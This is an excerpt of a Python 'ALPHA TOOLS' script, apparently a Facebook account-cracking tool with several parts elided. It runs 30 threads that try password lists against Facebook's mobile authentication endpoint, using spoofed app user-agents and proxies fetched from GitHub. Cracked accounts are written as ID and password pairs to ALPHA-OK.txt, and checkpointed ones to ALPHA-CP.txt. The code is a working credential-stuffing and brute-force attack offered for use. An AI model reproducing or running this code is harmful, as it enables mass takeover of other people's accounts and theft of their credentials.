...
print('\n\033[1;32m   Join Alpha Islamic Group ');time.sleep(1)
#os.system("xdg-open https://facebook.com/groups/892925915357288/")
print('\n\033[1;36m   WELCOME TO ALPHA TOOLS...');time.sleep(3)
...
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLIALPHA/main/.prox.txt').text
...
logo = """\033[1;97m
 ...
 \033[1;97m[+]-------------------------------------------------------
 \033[1;92m[+] AUTHOR     : \033[1;93mRolix Liwani && Mastan Charsi
 \033[1;94m[+] TELEGRAM   : \033[1;96mt.me/Alpha-Hack
 \033[1;95m[+] FACEBOOK   : \033[1;93mfacebook.com/Rolix.Liwani
 \033[1;92m[+] STATUS     : \033[93;1mTrial
 \033[1;91m[+] VIRSION    : \033[1;92m1.0.0
 \033[1;97m[+]-------------------------------------------------------"""
def linex():
        print('\033[1;37m-----------------------------------------')
def clear():
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ ALPHA-OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × ALPHA-CP.txt")
                                        print("\033[1;32m [+] PLEASE SUPPORT MY TEAM { MUSLIM TECH }")
                                        print('\033[1;97m [+]-------------------------------------------------------')
...
def afgan():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ ALPHA-OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × ALPHA-CP.txt")
                        print("\033[1;97m [+]\033[1;32m PLEASE SUPPORT MY TEAM { MUSLIM TECH }")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALPHA-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALPHA-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.75,width=1080,height=2400};FBLC/en_NZ;FBRV/str(random.randint(000000000 ,999999999));FBCR/Etisalat Af;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{cph};FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                    ...
                    'jazoest':str(random.randint(20000,40000)),
                    'advertising_id':adid,
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ALPHA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALPHA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [ALPHA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALPHA-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ALPHA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ALPHA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/ALPHA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ALPHA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ALPHA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
